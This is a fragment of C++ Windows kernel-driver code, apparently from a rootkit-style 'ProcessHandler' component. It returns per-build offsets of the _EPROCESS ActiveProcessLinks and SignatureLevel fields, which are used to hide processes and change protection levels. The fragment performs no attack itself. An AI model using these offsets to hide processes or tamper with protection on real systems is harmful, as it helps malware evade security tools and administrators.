* GetActiveProcessLinksOffset is responsible for getting the active process link offset depends on the windows version.
* (field ActiveProcessLinks in _EPROCESS structure)
*
* Parameters:
* There are no parameters.
*
* Returns:
* @activeProcessLinks [ULONG] -- Offset of active process links.
*/
_IRQL_requires_max_(APC_LEVEL)
ULONG ProcessHandler::GetActiveProcessLinksOffset() const {
	ULONG activeProcessLinks = 0;

	if (WindowsBuildNumber > LATEST_VERSION)
		return activeProcessLinks;

	switch (WindowsBuildNumber) {
	case WIN_1507:
	case WIN_1511:
	case WIN_1607:
	case WIN_1903:
	case WIN_1909:
		activeProcessLinks = 0x2f0;
		break;
	case WIN_1703:
	case WIN_1709:
	case WIN_1803:
	case WIN_1809:
		activeProcessLinks = 0x2e8;
		break;
	case WIN_11_24H2:
	case WIN_11_25H2:
		activeProcessLinks = 0x1d8;
		break;
	default:
		activeProcessLinks = 0x448;
		break;
	}

	return activeProcessLinks;
}

/*
* Description:
* GetSignatureLevelOffset is responsible for getting the signature level offset depends on the windows version.
* (field SignatureLevel in _EPROCESS structure)
*
* Parameters:
* There are no parameters.
*
* Returns:
* @signatureLevelOffset [UINT64] -- Offset of the process' signature level.
*/
ULONG ProcessHandler::GetSignatureLevelOffset() const {
	ULONG signatureLevelOffset = 0;

	if (WindowsBuildNumber > LATEST_VERSION)
		return signatureLevelOffset;

	switch (WindowsBuildNumber) {
	case WIN_1903:
	case WIN_1909:
		signatureLevelOffset = 0x6f8;
		break;
	case WIN_1703:
	case WIN_1709:
	case WIN_1803:
	case WIN_1809:
		signatureLevelOffset = 0x6c8;
		break;
	case WIN_1607:
		signatureLevelOffset = 0x6c0;
		break;
	case WIN_1511:
		signatureLevelOffset = 0x6b0;
		break;
	case WIN_1507:
		signatureLevelOffset = 0x6a8;
		break;
	case WIN_11_24H2:
	case WIN_11_25H2:
		signatureLevelOffset = 0x5f8;
		break;
	default:
		signatureLevelOffset = 0x878;
		break;
	}

	return signatureLevelOffset;
}